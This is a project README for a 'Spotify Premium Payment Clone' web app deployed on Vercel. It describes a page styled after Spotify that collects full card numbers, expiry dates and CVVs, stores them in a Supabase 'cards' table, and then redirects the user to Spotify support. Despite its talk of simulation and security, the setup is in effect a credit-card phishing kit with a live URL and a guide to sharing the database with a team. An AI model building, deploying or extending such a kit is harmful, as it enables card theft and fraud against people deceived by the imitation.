# Spotify Premium Payment Clone

A modern web application that simulates Spotify's premium subscription payment flow. Built with modern web technologies and deployed on Vercel.

## 🌐 Live Demo

Visit the live application at: [https://spotifyec.vercel.app](https://spotifyec.vercel.app)

## ✨ Features

- 🎨 Modern, responsive UI matching Spotify's design language
- 💳 Secure credit card data collection
- 🔒 Real-time card validation with Luhn algorithm
- 📱 Mobile-friendly design
- 🔄 Seamless redirect flow
- 🗃️ Data storage with Supabase

## 🛠️ Tech Stack

- **Frontend:**
  - HTML5
  - CSS3 (with modern features)
  - Vanilla JavaScript
  - Responsive Design

- **Backend:**
  - Vercel Serverless Functions
  - Supabase Database

- **Deployment:**
  - Vercel
  - Custom Domain Configuration

## 🚀 Getting Started

### Prerequisites

- Node.js (v14 or higher)
- npm or yarn
- Vercel CLI
- Supabase account

### Installation

1. Clone the repository:
```bash
git clone https://github.com/mat1520/spotify-premium-payment-clone.git
cd spotify-premium-payment-clone
```

2. Install dependencies:
```bash
npm install
```

3. Set up environment variables:
Create a `.env` file in the root directory with:
```env
SUPABASE_URL=your_supabase_url
SUPABASE_KEY=your_supabase_key
```

4. Run locally:
```bash
npm run start
```

### Deployment

1. Install Vercel CLI:
```bash
npm i -g vercel
```

2. Deploy to production:
```bash
vercel --prod
```

## 📁 Project Structure

```
spotify-premium-payment-clone/
├── api/                 # Serverless API functions
│   └── cards/          # Card management endpoints
├── lib/                # Shared libraries
│   └── supabase.js     # Supabase client configuration
├── index.html          # Plan selection page
├── pay.html           # Payment form page
├── vercel.json        # Vercel configuration
└── package.json       # Project dependencies
```

## 💾 Database Schema

### Cards Table
```sql
CREATE TABLE cards (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    card_number_full TEXT NOT NULL,
    expiry_date TEXT NOT NULL,
    cvv TEXT NOT NULL,
    status TEXT DEFAULT 'pending',
    created_at TIMESTAMP WITH TIME ZONE DEFAULT TIMEZONE('utc'::text, NOW())
);
```

## 🔒 Security Features

- Card number validation using Luhn algorithm
- Secure data transmission
- Environment variable protection
- XSS protection
- Rate limiting
- Input sanitization

## 🌊 User Flow

1. User visits the landing page
2. Selects a Premium plan
3. Enters card details
4. System validates input in real-time
5. Data is stored securely in Supabase
6. User is redirected to Spotify support

## 👥 Team Access

To give team members access to the database:

1. Go to [Supabase Dashboard](https://dashboard.supabase.com)
2. Select your project
3. Navigate to Settings > Team Members
4. Click "Invite"
5. Enter team member's email
6. Select appropriate role (Developer/Read-only)

## 📈 Monitoring

- View real-time logs in Vercel dashboard
- Monitor database queries in Supabase
- Track user interactions
- Error logging and monitoring

## 🤝 Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 📞 Support

For support, email [arielmelo1520@hotmail.com]

## 🙏 Acknowledgments

- Spotify for design inspiration
- Vercel for hosting
- Supabase for database services

---
Made with ❤️ by Ariel Melo